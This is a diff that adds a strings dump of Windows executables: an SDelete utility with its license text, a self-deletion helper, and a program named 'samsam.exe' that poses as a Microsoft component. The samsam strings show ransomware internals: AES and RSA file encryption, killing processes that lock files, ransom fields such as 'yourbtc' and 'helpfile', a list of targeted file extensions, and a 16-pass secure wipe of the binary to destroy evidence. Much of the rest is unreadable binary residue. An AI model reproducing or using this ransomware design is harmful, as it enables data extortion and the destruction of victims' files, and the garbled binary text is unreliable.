@@ -1,0 +1,1127 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+L$hjXQ
+T$hjZR
+T$(RWQS
+D$HPQS
+L$ QWRS
+|$$)|$
+L$$QPU
+\$<t&h
+T$0;T$ u
+D$4;D$$
+L$PQSSj
+T$XRh@
+L$,QRP
+r=PSB
+0A@@Ju
+to=8^B
+HHtXHHt
+>If90t
+j@j ^V
+_VVVVV
+_VVVVV
+u)jAXf;
+u)jAXf;
+>=Yt1j
+QQSVWh
+URPQQh8
+0SSSSS
+0SSSSS
+0SSSSS
+ji_jdZf;
+It.It+It!It
+It"IIuQ
+t"SS9]
+v$;5\^B
+C PjPV
+C$PjQV
+C*PjTV
+C+PjUV
+C,PjVV
+C-PjWV
+C.PjRV
+C/PjSV
+.;1s(N
+HHt4HHt
+Ht\Ht,
+teHtFHt&Hu
+ty<%tA
+PPPPPPPP
+tNh,0B
+t=h(0B
+Vj@hP-B
+u%h00B
+PPPPPPPP
+^SSSSS
+j"^SSSSS
+HHtYHHt
+tM<it-<ot)<ut%<xt!<Xt
+<dty<itu<otq<utm<xti<Xte
+HIf98t
+u,VVWV
+t VV9u
+0WWWWW
+AAFFf;
+;t$,v-
+UQPXY]Y[
+t+WWVPV
+^SSSSS
+^SSSSS
+j,hH7B
+>:u8FV
+Pf950kB
+VVVVVQRSSj
+^SSSSS
+^SSSSS
+0SSSSS
+^SSSSS
+^WWWWW
+0SSSSS
+8VVVVV
+\pard\lang1033\b0\fs20\par
+\b EFFET JURIDIQUE.\b0   Le pr\'e9sent contrat d\'e9crit certains droits juridiques. Vous pourriez avoir d'autres droits pr\'e9vus par les lois de votre pays.  Le pr\'e9sent contrat ne modifie pas les droits que vous conf\'e8rent les lois de votre pays si celles-ci ne le permettent pas.\b\par
+\pard\sb120\sa120 Elle s'applique \'e9galement, m\'eame si Sysinternals connaissait ou devrait conna\'eetre l'\'e9ventualit\'e9 d'un tel dommage.  Si votre pays n'autorise pas l'exclusion ou la limitation de responsabilit\'e9 pour les dommages indirects, accessoires ou de quelque nature que ce soit, il se peut que la limitation ou l'exclusion ci-dessus ne s'appliquera pas \'e0 votre \'e9gard.\par
+\pard\fi-363\li720\sb120\sa120\tx720\'b7\tab les r\'e9clamations au titre de violation de contrat ou de garantie, ou au titre de responsabilit\'e9 stricte, de n\'e9gligence ou d'une autre faute dans la limite autoris\'e9e par la loi en vigueur.\par
+\pard\keepn\fi-360\li720\sb120\sa120\tx720\lang1036\'b7\tab tout  ce qui est reli\'e9 au logiciel, aux services ou au contenu (y compris le code) figurant sur des sites Internet tiers ou dans des programmes tiers ; et\par
+\lang1033 Cette limitation concerne :\par
+\pard\keepn\sb120\sa120\b LIMITATION DES DOMMAGES-INT\'c9R\'caTS ET EXCLUSION DE RESPONSABILIT\'c9 POUR LES DOMMAGES.\b0   Vous pouvez obtenir de Sysinternals et de ses fournisseurs une indemnisation en cas de dommages directs uniquement \'e0 hauteur de 5,00 $ US. Vous ne pouvez pr\'e9tendre \'e0 aucune indemnisation pour les autres dommages, y compris les dommages sp\'e9ciaux, indirects ou accessoires et pertes de b\'e9n\'e9fices.\par
+\pard\sb120\sa120 EXON\'c9RATION DE GARANTIE.\b0  Le logiciel vis\'e9 par une licence est offert \'ab tel quel \'bb. Toute utilisation de ce logiciel est \'e0 votre seule risque et p\'e9ril. Sysinternals n'accorde aucune autre garantie expresse. Vous pouvez b\'e9n\'e9ficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut modifier. La ou elles sont permises par le droit locale, les garanties implicites de qualit\'e9 marchande, d'ad\'e9quation \'e0 un usage particulier et d'absence de contrefa\'e7on sont exclues.\par
+\pard\sb240\lang1036 Remarque : Ce logiciel \'e9tant distribu\'e9 au Qu\'e9bec, Canada, certaines des clauses dans ce contrat sont fournies ci-dessous en fran\'e7ais.\par
+\pard\b Please note: As this software is distributed in Quebec, Canada, some of the clauses in this agreement are provided below in French.\par
+\pard\li360\sb120\sa120 It also applies even if Sysinternals knew or should have known about the possibility of the damages.  The above limitation or exclusion may not apply to you because your country may not allow the exclusion or limitation of incidental, consequential or other damages.\par
+\pard\fi-363\li720\sb120\sa120\'b7\tab claims for breach of contract, breach of warranty, guarantee or condition, strict liability, negligence, or other tort to the extent permitted by applicable law.\par
+\pard\fi-363\li720\sb120\sa120\tx720\'b7\tab anything related to the software, services, content (including code) on third party Internet sites, or third party programs; and\par
+\pard\li357\sb120\sa120\b0\caps0 This limitation applies to\par
+\pard\fi-360\li360\sb120\sa120\tx360\fs20 10.\tab\fs19 Limitation on and Exclusion of Remedies and Damages.  You can recover from SYSINTERNALS and its suppliers only direct damages up to U.S. $5.00.  You cannot recover any other damages, including consequential, lost profits, special, indirect or incidental damages.\par
+\fs20 9.\tab\fs19 Disclaimer of Warranty.\caps0    \caps The software is licensed \ldblquote as-is.\rdblquote   You bear the risk of using it.  SYSINTERNALS gives no express warranties, guarantees or conditions.  You may have additional consumer rights under your local laws which this agreement cannot change.  To the extent permitted under your local laws, SYSINTERNALS excludes the implied warranties of merchantability, fitness for a particular purpose and non-infringement.\par
+\pard\fi-357\li357\sb120\sa120\tx360\caps\fs20 8.\tab\fs19 Legal Effect.\b0\caps0   This agreement describes certain legal rights.  You may have other rights under the laws of your country.  You may also have rights with respect to the party from whom you acquired the software.  This agreement does not change your rights under the laws of your country if the laws of your country do not permit it to do so.\b\caps\par
+\pard\fi-363\li720\sb120\sa120\fs20 b.\tab\fs19 Outside the United States.\b0   If you acquired the software in any other country, the laws of that country apply.\b\par
+\pard\fi-363\li720\sb120\sa120\tx720\cf0\fs20 a.\tab\fs19 United States.\b0   If you acquired the software in the United States, Washington state law governs the interpretation of this agreement and applies to claims for breach of it, regardless of conflict of laws principles.  The laws of the state where you live govern all other claims, including claims under state consumer protection laws, unfair competition laws, and in tort.\b\par
+\pard\keepn\fi-360\li360\sb120\sa120\tx360\cf2\b\caps\fs20 7.\tab\fs19 Applicable Law\caps0 .\par
+\caps\fs20 6.\tab\fs19 Entire Agreement.\b0\caps0   This agreement, and the terms for supplements, updates, Internet-based services and support services that you use, are the entire agreement for the software and support services.\par
+\caps\fs20 5.\tab\fs19 SUPPORT SERVICES.\caps0  \b0 Because this software is \ldblquote as is,\rdblquote  we may not provide support services for it.\b\par
+\caps\fs20 4.\tab\fs19 Export Restrictions\caps0 .\b0   The software is subject to United States export laws and regulations.  You must comply with all domestic and international export laws and regulations that apply to the software.  These laws include restrictions on destinations, end users and end use.  For additional information, see \cf1\ul www.microsoft.com/exporting <http://www.microsoft.com/exporting>\cf0\ulnone .\b\par
+\pard\fi-357\li357\sb120\sa120\tx360\b\fs20 3.\tab\fs19 DOCUMENTATION.\b0   Any person that has valid access to your computer or internal network may copy and use the documentation for your internal, reference purposes.\b\par
+\'b7\tab use the software for commercial software hosting services.\par
+\'b7\tab transfer the software or this agreement to any third party; or\par
+\'b7\tab rent, lease or lend the software;\par
+\'b7\tab publish the software for others to copy;\par
+\'b7\tab make more copies of the software than specified in this agreement or allowed by applicable law, despite this limitation;\par
+\pard\fi-363\li720\sb120\sa120\'b7\tab reverse engineer, decompile or disassemble the binary versions of the software, except and only to the extent that applicable law expressly permits, despite this limitation;\par
+\pard\fi-363\li720\sb120\sa120\tx720\b0\'b7\tab work around any technical limitations in the binary versions of the software;\par
+\caps\fs20 2.\tab\fs19 Scope of License\caps0 .\b0   The software is licensed, not sold. This agreement only gives you some rights to use the software.  Sysinternals reserves all other rights.  Unless applicable law gives you more rights despite this limitation, you may use the software only as expressly permitted in this agreement.  In doing so, you must comply with any technical limitations in the software that only allow you to use it in certain ways.    You may not\b\par
+\pard\fi-357\li357\sb120\sa120\tx360\fs20 1.\tab\fs19 INSTALLATION AND USE RIGHTS.  \b0 You may install and use any number of copies of the software on your devices.\b\par
+\pard\brdrt\brdrs\brdrw10\brsp20 \sb120\sa120 If you comply with these license terms, you have the rights below.\par
+\b BY USING THE SOFTWARE, YOU ACCEPT THESE TERMS.  IF YOU DO NOT ACCEPT THEM, DO NOT USE THE SOFTWARE.\par
+\pard\sb120\sa120 for this software, unless other terms accompany those items.  If so, those terms apply.\par
+\'b7\tab support services\par
+\'b7\tab Internet-based services, and \par
+\pard\fi-363\li720\sb120\sa120\'b7\tab supplements,\par
+\pard\fi-363\li720\sb120\sa120\tx720\'b7\tab updates,\par
+\pard\sb120\sa120\b0\fs19 These license terms are an agreement between Sysinternals (a wholly owned subsidiary of Microsoft Corporation) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the media on which you received it, if any.  The terms also apply to any Sysinternals\par
+{\*\generator Msftedit 5.41.21.2506;}\viewkind4\uc1\pard\brdrb\brdrs\brdrw10\brsp20 \sb120\sa120\b\f0\fs24 SYSINTERNALS SOFTWARE LICENSE TERMS\fs28\par
+{\colortbl ;\red0\green0\blue255;\red0\green0\blue0;}
+{\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fswiss\fprq2\fcharset0 Tahoma;}}
+CommandLineToArgvW
+Scanning file: 
+GetDiskFreeSpaceExW
+RtlNtStatusToDosError
+NtFsControlFile
+Invalid drive letter: %s
+Argument must be formatted like d:
+SDelete is set for %d pass%s.
+Wow64EnableWow64FsRedirection
+CorExitProcess
+runtime error 
+TLOSS error
+SING error
+DOMAIN error
+An application has made an attempt to load the C runtime library incorrectly.
+Please contact the application's support team for more information.
+- Attempt to use MSIL code from this assembly during native code initialization
+This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.
+- not enough space for locale information
+- Attempt to initialize the CRT more than once.
+This indicates a bug in your application.
+- CRT not initialized
+- unable to initialize heap
+- not enough space for lowio initialization
+- not enough space for stdio initialization
+- pure virtual function call
+- not enough space for _onexit/atexit table
+- unable to open console device
+- unexpected heap error
+- unexpected multithread lock error
+- not enough space for thread data
+This application has requested the Runtime to terminate it in an unusual way.
+Please contact the application's support team for more information.
+- not enough space for environment
+- not enough space for arguments
+- floating point support not loaded
+Microsoft Visual C++ Runtime Library
+<program name unknown>
+Runtime Error!
+Program: 
+LC_TIME
+LC_NUMERIC
+LC_MONETARY
+LC_CTYPE
+LC_COLLATE
+LC_ALL
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+EncodePointer
+DecodePointer
+FlsFree
+FlsSetValue
+FlsGetValue
+FlsAlloc
+(null)
+`h````
+xpxxxx
+SystemFunction036
+ADVAPI32.DLL
+GetProcessWindowStation
+GetUserObjectInformationA
+GetLastActivePopup
+GetActiveWindow
+MessageBoxA
+USER32.DLL
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+HH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+united-states
+united-kingdom
+trinidad & tobago
+south-korea
+south-africa
+south korea
+south africa
+slovak
+puerto-rico
+pr-china
+pr china
+new-zealand
+hong-kong
+holland
+great britain
+england
+britain
+america
+swedish-finland
+spanish-venezuela
+spanish-uruguay
+spanish-puerto rico
+spanish-peru
+spanish-paraguay
+spanish-panama
+spanish-nicaragua
+spanish-modern
+spanish-mexican
+spanish-honduras
+spanish-guatemala
+spanish-el salvador
+spanish-ecuador
+spanish-dominican republic
+spanish-costa rica
+spanish-colombia
+spanish-chile
+spanish-bolivia
+spanish-argentina
+portuguese-brazilian
+norwegian-nynorsk
+norwegian-bokmal
+norwegian
+italian-swiss
+irish-english
+german-swiss
+german-luxembourg
+german-lichtenstein
+german-austrian
+french-swiss
+french-luxembourg
+french-canadian
+french-belgian
+english-usa
+english-us
+english-uk
+english-trinidad y tobago
+english-south africa
+english-nz
+english-jamaica
+english-ire
+english-caribbean
+english-can
+english-belize
+english-aus
+english-american
+dutch-belgian
+chinese-traditional
+chinese-singapore
+chinese-simplified
+chinese-hongkong
+chinese
+canadian
+belgian
+australian
+american-english
+american english
+american
+Norwegian-Nynorsk
+`h`hhh
+xppwpp
+SunMonTueWedThuFriSat
+JanFebMarAprMayJunJulAugSepOctNovDec
+CONIN$
+CONOUT$
+c:\src\Misc\sdel\Release\sdelete.pdb
+GetModuleHandleW
+LocalFree
+LoadLibraryW
+LocalAlloc
+GetCommandLineW
+GetProcAddress
+FormatMessageW
+MoveFileW
+ReadFile
+WriteFile
+VirtualFree
+SetFilePointer
+VirtualAlloc
+SetFileAttributesW
+GetFileAttributesW
+DeleteFileW
+CloseHandle
+GetLastError
+CreateFileW
+WaitForSingleObject
+GetDiskFreeSpaceW
+FindClose
+FindNextFileW
+RemoveDirectoryW
+FindFirstFileW
+DeviceIoControl
+ExpandEnvironmentStringsW
+GetVersion
+GetFullPathNameW
+GetCurrentDirectoryW
+KERNEL32.dll
+SendMessageW
+InflateRect
+SetCursor
+LoadCursorW
+SetWindowTextW
+EndDialog
+GetSysColorBrush
+GetDlgItem
+DialogBoxIndirectParamW
+USER32.dll
+EndDoc
+EndPage
+StartPage
+StartDocW
+SetMapMode
+GetDeviceCaps
+GDI32.dll
+PrintDlgW
+COMDLG32.dll
+RegCloseKey
+RegSetValueExW
+RegQueryValueExW
+RegCreateKeyW
+ADVAPI32.dll
+HeapAlloc
+HeapFree
+GetSystemTimeAsFileTime
+EnterCriticalSection
+LeaveCriticalSection
+ExitProcess
+DeleteCriticalSection
+FatalAppExitA
+HeapReAlloc
+HeapCreate
+HeapDestroy
+GetStdHandle
+GetModuleFileNameA
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+GetCPInfo
+InterlockedIncrement
+InterlockedDecrement
+GetACP
+GetOEMCP
+IsValidCodePage
+TlsGetValue
+TlsAlloc
+TlsSetValue
+TlsFree
+SetLastError
+GetCurrentThreadId
+GetCurrentThread
+WideCharToMultiByte
+GetConsoleCP
+GetConsoleMode
+FlushFileBuffers
+SetHandleCount
+GetFileType
+GetStartupInfoA
+SetConsoleCtrlHandler
+FreeLibrary
+InterlockedExchange
+LoadLibraryA
+InitializeCriticalSectionAndSpinCount
+GetModuleFileNameW
+FreeEnvironmentStringsW
+GetEnvironmentStringsW
+QueryPerformanceCounter
+GetTickCount
+GetCurrentProcessId
+RtlUnwind
+MultiByteToWideChar
+LCMapStringA
+LCMapStringW
+GetStringTypeA
+GetStringTypeW
+GetTimeFormatA
+GetDateFormatA
+GetUserDefaultLCID
+GetLocaleInfoA
+EnumSystemLocalesA
+IsValidLocale
+WriteConsoleA
+GetConsoleOutputCP
+WriteConsoleW
+SetStdHandle
+HeapSize
+GetLocaleInfoW
+GetTimeZoneInformation
+CreateFileA
+CompareStringA
+CompareStringW
+SetEnvironmentVariableA
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXX
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Code Signing PCA0
+120904214209Z
+130304214209Z0
+Washington1
+Redmond1
+Microsoft Corporation1
+Microsoft Corporation0
+Ehttp://crl.microsoft.com/pki/crl/products/MicCodSigPCA_08-31-2010.crl0Z
+>http://www.microsoft.com/pki/certs/MicCodSigPCA_08-31-2010.crt0
+Washington1
+Redmond1
+Microsoft Corporation1!0
+Microsoft Time-Stamp PCA0
+120109222559Z
+130409222559Z0
+Washington1
+Redmond1
+Microsoft Corporation1
+MOPR1'0%
+nCipher DSE ESN:B8EC-30A4-71441%0#
+Microsoft Time-Stamp Service0
+Chttp://crl.microsoft.com/pki/crl/products/MicrosoftTimeStampPCA.crl0X
+<http://www.microsoft.com/pki/certs/MicrosoftTimeStampPCA.crt0
+microsoft1-0+
+$Microsoft Root Certificate Authority0
+100831221932Z
+200831222932Z0y1
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Code Signing PCA0
+?http://crl.microsoft.com/pki/crl/products/microsoftrootcert.crl0T
+8http://www.microsoft.com/pki/certs/MicrosoftRootCert.crt0
+`Ge`@N
+microsoft1-0+
+$Microsoft Root Certificate Authority0
+070403125309Z
+210403130309Z0w1
+Washington1
+Redmond1
+Microsoft Corporation1!0
+Microsoft Time-Stamp PCA0
+microsoft1-0+
+$Microsoft Root Certificate Authority
+?http://crl.microsoft.com/pki/crl/products/microsoftrootcert.crl0T
+8http://www.microsoft.com/pki/certs/MicrosoftRootCert.crt0
+1Jv1=+r
+L&*H$_Z
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Code Signing PCA
+*http://technet.microsoft.com/sysinternals 0
+Washington1
+Redmond1
+Microsoft Corporation1!0
+Microsoft Time-Stamp PCA
+130109222603Z0#
+F2YB-i
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+v2.0.50727
+#Strings
+<Module>
+selfdel.exe
+Program
+selfdel
+mscorlib
+System
+Object
+proc_exe
+System.Reflection
+AssemblyTitleAttribute
+AssemblyDescriptionAttribute
+AssemblyConfigurationAttribute
+AssemblyCompanyAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyTrademarkAttribute
+AssemblyCultureAttribute
+System.Runtime.InteropServices
+ComVisibleAttribute
+GuidAttribute
+AssemblyVersionAttribute
+AssemblyFileVersionAttribute
+System.Diagnostics
+DebuggableAttribute
+DebuggingModes
+System.Runtime.CompilerServices
+CompilationRelaxationsAttribute
+RuntimeCompatibilityAttribute
+Process
+GetProcessesByName
+System.Threading
+Thread
+System.IO
+Directory
+GetCurrentDirectory
+String
+Concat
+Delete
+Exception
+ProcessStartInfo
+set_RedirectStandardOutput
+set_RedirectStandardError
+System.Text
+Encoding
+GetEncoding
+set_StandardOutputEncoding
+ProcessWindowStyle
+set_WindowStyle
+set_UseShellExecute
+set_CreateNoWindow
+StreamReader
+get_StandardOutput
+TextReader
+ReadToEnd
+IDisposable
+Dispose
+get_StandardError
+selfdel
+Copyright 
+  2015
+$c452dfd9-5bfe-4369-a8fa-207e04074a23
+1.0.0.0
+WrapNonExceptionThrows
+f:\SAM\selfdel\selfdel\obj\Release\selfdel.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+v2.0.50727
+#Strings
+<Module>
+samsam.exe
+FileUtil
+RM_UNIQUE_PROCESS
+RM_APP_TYPE
+RM_PROCESS_INFO
+Program
+Resources
+samsam.Properties
+mscorlib
+System
+Object
+ValueType
+chunkSize
+headerSize
+Encrypt
+checkOSCompatibility
+EncryptFile
+GetBytesFromFile
+killOpenedProcessTree
+System.Diagnostics
+Process
+KillProcessWithWait
+WriteBytesToFile
+WriteHeaderBytesToFile
+EncryptStringToBytes
+CalculateSignature
+GenerateRandom
+RSAEncryptBytes
+GetBytesFromString
+RmRebootReasonNone
+CCH_RM_MAX_APP_NAME
+CCH_RM_MAX_SVC_NAME
+RmRegisterResources
+RmStartSession
+RmEndSession
+RmGetList
+System.Collections.Generic
+List`1
+WhoIsLocking
+dwProcessId
+System.Runtime.InteropServices.ComTypes
+FILETIME
+ProcessStartTime
+value__
+RmUnknownApp
+RmMainWindow
+RmOtherWindow
+RmService
+RmExplorer
+RmConsole
+RmCritical
+strAppName
+strServiceShortName
+ApplicationType
+AppStatus
+TSSessionId
+bRestartable
+mylist250
+mylist500
+mylist1000
+mylistbig
+openfiles
+comname
+publickey
+currentdir
+helpfile
+helpfileext
+ext_enc
+yourweb
+yourbtc
+txthelp
+sysdir
+myeenncc
+islocked
+MakePath
+encryptFile
+isValidFilePath
+recursivegetfiles
+create_from_resource
+create_desk_file
+Base64Encode
+Base64Decode
+ToHexString
+FromHexString
+System.Resources
+ResourceManager
+resourceMan
+System.Globalization
+CultureInfo
+resourceCulture
+get_ResourceManager
+get_Culture
+set_Culture
+Culture
+plainFilePath
+encryptedFilePath
+manifestFilePath
+rsaKey
+signatureKey
+fullFilePath
+readCount
+System.Runtime.InteropServices
+OutAttribute
+fileName
+waitForExit
+_FileName
+_ByteArray
+plainBuf
+filePath
+length
+keyXml
+pSessionHandle
+nFiles
+rgsFilenames
+nApplications
+rgApplications
+InAttribute
+nServices
+rgsServiceNames
+dwSessionFlags
+strSessionKey
+dwSessionHandle
+pnProcInfoNeeded
+pnProcInfo
+rgAffectedApps
+lpdwRebootReasons
+pathfile
+FileName
+newSuffix
+publicKeyPath
+strFilePath
+plainText
+base64EncodedData
+hexString
+System.Reflection
+AssemblyTitleAttribute
+AssemblyDescriptionAttribute
+AssemblyConfigurationAttribute
+AssemblyCompanyAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyTrademarkAttribute
+AssemblyCultureAttribute
+ComVisibleAttribute
+GuidAttribute
+AssemblyVersionAttribute
+AssemblyFileVersionAttribute
+DebuggableAttribute
+DebuggingModes
+System.Runtime.CompilerServices
+CompilationRelaxationsAttribute
+RuntimeCompatibilityAttribute
+samsam
+Environment
+OperatingSystem
+get_OSVersion
+Version
+get_Version
+get_Major
+System.IO
+Exists
+Delete
+FileInfo
+Buffer
+BlockCopy
+get_Length
+Convert
+ToBase64String
+String
+Concat
+Exception
+get_Message
+Console
+WriteLine
+FileStream
+FileMode
+FileAccess
+FileShare
+Stream
+SeekOrigin
+IDisposable
+Dispose
+Enumerator
+GetEnumerator
+get_Current
+MoveNext
+get_HasExited
+WaitForExit
+ToString
+ArgumentNullException
+System.Security.Cryptography
+RijndaelManaged
+SymmetricAlgorithm
+set_KeySize
+set_FeedbackSize
+set_Key
+set_IV
+PaddingMode
+set_Padding
+get_Key
+get_IV
+ICryptoTransform
+CreateEncryptor
+MemoryStream
+CryptoStream
+CryptoStreamMode
+FlushFinalBlock
+ToArray
+HMACSHA256
+HashAlgorithm
+ComputeHash
+RNGCryptoServiceProvider
+RandomNumberGenerator
+GetBytes
+RSACryptoServiceProvider
+AsymmetricAlgorithm
+FromXmlString
+ToCharArray
+.cctor
+get_NewLine
+DllImportAttribute
+rstrtmgr.dll
+NewGuid
+GetProcessById
+ArgumentException
+StructLayoutAttribute
+LayoutKind
+MarshalAsAttribute
+UnmanagedType
+IsNullOrEmpty
+ReadAllText
+System.Threading
+Thread
+ThreadStart
+DriveInfo
+GetDrives
+get_IsReady
+get_Name
+get_Count
+get_AvailableFreeSpace
+get_DirectoryName
+FileSystemInfo
+FileAttributes
+set_Attributes
+WriteAllText
+UnauthorizedAccessException
+GetFileNameWithoutExtension
+GetDirectoryName
+Combine
+get_Extension
+ProcessStartInfo
+set_RedirectStandardOutput
+set_RedirectStandardError
+System.Text
+Encoding
+GetEncoding
+set_StandardOutputEncoding
+ProcessWindowStyle
+set_WindowStyle
+set_UseShellExecute
+set_CreateNoWindow
+StreamReader
+get_StandardOutput
+TextReader
+ReadToEnd
+get_StandardError
+get_StackTrace
+<>c__DisplayClass1
+<recursivegetfiles>b__0
+element
+ToLower
+op_Equality
+op_Inequality
+Contains
+DirectoryInfo
+GetFiles
+get_FullName
+GetExtension
+Predicate`1
+GetDirectories
+Assembly
+GetExecutingAssembly
+GetManifestResourceNames
+GetManifestResourceStream
+GetEnvironmentVariable
+Directory
+GetParent
+get_UTF8
+FromBase64String
+GetString
+StringBuilder
+get_Unicode
+Append
+Substring
+ToByte
+get_MachineName
+GetCurrentDirectory
+get_SystemDirectory
+GetPathRoot
+CompilerGeneratedAttribute
+System.CodeDom.Compiler
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+ReferenceEquals
+RuntimeTypeHandle
+GetTypeFromHandle
+get_Assembly
+System.ComponentModel
+EditorBrowsableAttribute
+EditorBrowsableState
+samsam.Properties.Resources.resources
+samsam.del.exe
+samsam.selfdel.exe
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+MicrosoftSAM
+Microsoft
+Copyright 
+  2014
+$b83df556-b2ab-4b0c-9301-33efb43cafe3
+2.4.8.4
+WrapNonExceptionThrows
+f:\SAM\clients\Sam12\SAM\obj\Release\samsam.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+}Sysinternals License
+%s License Agreement
+RICHEDIT
+&Print
+&Decline
+&Agree
+You can also use the /accepteula command-line switch to accept the EULA.
+MS Shell Dlg
+License Agreement
+Riched32.dll
+EulaAccepted
+Software\Sysinternals\%s
+-accepteula
+/accepteula
+Shell32.dll
+deleted.
+Error renaming file back to original name. File is left as %s
+Error deleting %s: 
+Error overwriting %s: 
+Error opening %s for delete: 
+Error opening %s for compressed file scan: 
+%s\*.*
+Free space cleaned on %s                                       
+Cleaning MFT...%c
+                                                           
+%sSDELMFT%06d
+%s\SDELMFT%06d
+%sSDELTEMP1
+%s\SDELTEMP1
+Cleaning free space on %s: %d%%
+Cleaning free space to securely delete compressed files: %d%%
+Could not create free-space cleanup file: 
+%sSDELTEMP
+Your disk quota prevents you from zeroing free space on this drive.
+Could not determine amount of free space: 
+%s\SDELTEMP
+%TEMP%
+kernel32.dll
+WCould not determine disk cluster size: 
+Zeroing free space on %s: 0%%
+Zeroing free space to securely delete compressed files: 0%%
+Cannot clean free space for UNC drive
+|/-\|/-\
+Could not find RtlNtStatusToDosError entry point in NTDLL.DLL
+Could not find NtFsControlFile entry point in NTDLL.DLL
+ntdll.dll
+e   -z         Zero free space (good for virtual disk optimization)
+   -s or -r   Recurse subdirectories
+   -q         Don't print errors (Quiet)
+   -p passes  Specifies number of overwrite passes (default is 1)
+   -c         Clean free space
+   -a         Remove Read-Only attribute
+       %s [-p passes] [-z|-c] [drive letter] ...
+usage: %s [-p passes] [-s] [-q] <file or directory> ...
+No files/folders found that match %s.
+%ld drives zapped
+%ld folders found
+%ld files found
+Kernel32.dll
+SDelete
+Sysinternals - www.sysinternals.com
+Copyright (C) 1999-2012 Mark Russinovich
+SDelete - Secure Delete v1.61
+mscoree.dll
+KERNEL32.DLL
+(null)
+         (((((                  H
+         h((((                  H
+                                 H
+\\.\A:
+VS_VERSION_INFO
+StringFileInfo
+040904b0
+CompanyName
+Sysinternals
+FileDescription
+sdelete
+FileVersion
+InternalName
+sdelete
+LegalCopyright
+Copyright 
+ 1999-2012 Mark Russinovich
+OriginalFilename
+sdelete.exe
+ProductName
+Sysinternals Sdelete
+ProductVersion
+VarFileInfo
+Translation
+,Sysinternals Utilitie
+samsam
+del.exe
+ -p 16 samsam.exe
+\del.exe
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+FileDescription
+selfdel
+FileVersion
+1.0.0.0
+InternalName
+selfdel.exe
+LegalCopyright
+Copyright 
+  2015
+OriginalFilename
+selfdel.exe
+ProductName
+selfdel
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
+<MtAeSKeYForFile>
+</Key>
+<Value>
+</Value>
+<EncryptedKey>
+</EncryptedKey>
+<OriginalFileLength>
+</OriginalFileLength>
+</MtAeSKeYForFile>
+Key is not correct format : 
+Exception caught in process: {0}
+plainText
+Could not begin restart session.  Unable to determine file locker.
+Could not register resource.
+Could not list processes locking resource.
+Could not list processes locking resource. Failed to get size of result.
+.manifest.xml
+<------------>
+Windows
+Reference Assemblies\Microsoft
+Recycle.Bin
+userprofile
+\Desktop
+\Desktop\
+.accdb
+.accde
+.accdr
+.accdt
+.backup
+.backupdb
+.blend
+.class
+.phtml
+.db-journal
+.design
+.erbsql
+.ibank
+.incpas
+.moneywell
+.pages
+.psafe3
+.pspimage
+.sas7bdat
